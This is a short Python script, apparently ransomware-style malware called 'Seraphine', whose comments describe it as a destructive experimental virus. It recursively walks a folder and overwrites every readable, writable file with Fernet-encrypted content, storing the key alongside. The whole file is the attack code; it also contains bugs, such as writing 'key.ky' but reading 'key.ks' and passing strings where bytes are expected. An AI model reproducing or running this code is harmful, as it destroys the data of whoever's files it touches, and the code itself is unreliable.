import os
from cryptography.fernet import Fernet


# This is an experimental virus, it's very simple yet can be very destructive if used in the right root folder and against the right target
# DO NOT RUN THIS ON AN IMPORTANT FOLDER/COMPUTER 
# Executing this code is on your responsible only, have fun and destructive time <3

def create_key():
    if os.path.exists("./key.ky"):
        return read_key()
    
    key = Fernet.generate_key()
    with open("key.ky", "wb") as keyFile:
        keyFile.write(key)
    return key


def read_key():
    with open("key.ks", "rb") as keyFile:
        return keyFile.read()


def create_fernet(key):
    return Fernet(key)


def encrypt_text(text:str, fernet:Fernet):
    return fernet.encrypt(text)


def extract_files_from_root(root):
    all_files = []
    for root, dirs, files in os.walk(root):
        for file in files:
            path = os.path.join(root, file)
            all_files.append(path)
            print(path)
        for dir in dirs:
            all_files.extend(extract_files_from_root(os.path.join(root, dir)))
    return all_files


def read_file(path):
    content = ""
    with open(path, "r") as source:
        content = source.read()
    return content


def write_to_file(text, path):
    with open(path, "w") as target:
        target.write(text)


def has_access(path):
    return os.access(path, os.F_OK) and os.access(path, os.W_OK) and os.access(path, os.R_OK)


def execute_file(path, executer):
    if has_access(path):
        text_to_encrypt = read_file(path)
        encrypted_content = encrypt_text(text_to_encrypt, executer)
        write_to_file(encrypted_content, path)
        print("NOM NOM")


def Seraphine(root = "."):
    key = create_key()
    fernet = create_fernet(key)
    victims = extract_files_from_root(root)
    for victim in victims:
        if victim != "seraphine2.py":
            print(f"executing {victim}")
            execute_file(victim, fernet)
            print(f"{victim} has been executed\n")
